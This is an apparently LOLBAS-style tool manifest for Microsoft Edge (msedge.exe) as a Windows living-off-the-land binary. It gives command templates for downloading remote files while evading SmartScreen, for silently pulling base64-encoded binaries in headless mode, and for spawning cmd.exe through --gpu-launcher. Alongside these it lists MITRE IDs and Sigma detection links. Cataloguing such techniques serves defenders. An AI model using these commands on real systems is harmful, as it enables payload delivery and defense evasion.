---
id: windows-download-msedge
namespace: windows:download:msedge
name: msedge
description: 'Microsoft Edge browser Located at: c:\Program Files\Microsoft\Edge\Application\msedge.exe; c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe.'
author: mr.d0x
version: 1.0.0
capabilities:
- network.transfer.download
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- msedge
parameters: []
features: []
execution:
  template: msedge
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen. (Download file from the internet)
  command: msedge.exe {REMOTEURL:.exe.txt}
- description: Edge will silently download the file. File extension should be .html and binaries should be encoded. (Download file from the internet)
  command: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
- description: Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command (Executes a process under a trusted Microsoft signed binary)
  command: msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
references:
- label: '1478116126005641220'
  url: https://twitter.com/mrd0x/status/1478116126005641220
- label: '1478234484881436672'
  url: https://twitter.com/mrd0x/status/1478234484881436672
techniques:
- exfiltration
- execution
- defense-evasion
mitre_ids:
- T1105
- T1218.015
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml
install:
- method: choco
  package_name: msedge
  commands:
  - choco install msedge
---


# msedge

msedge is a Windows LOLBin. Microsoft Edge browser Located at: c:\Program Files\Microsoft\Edge\Application\msedge.exe; c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe.
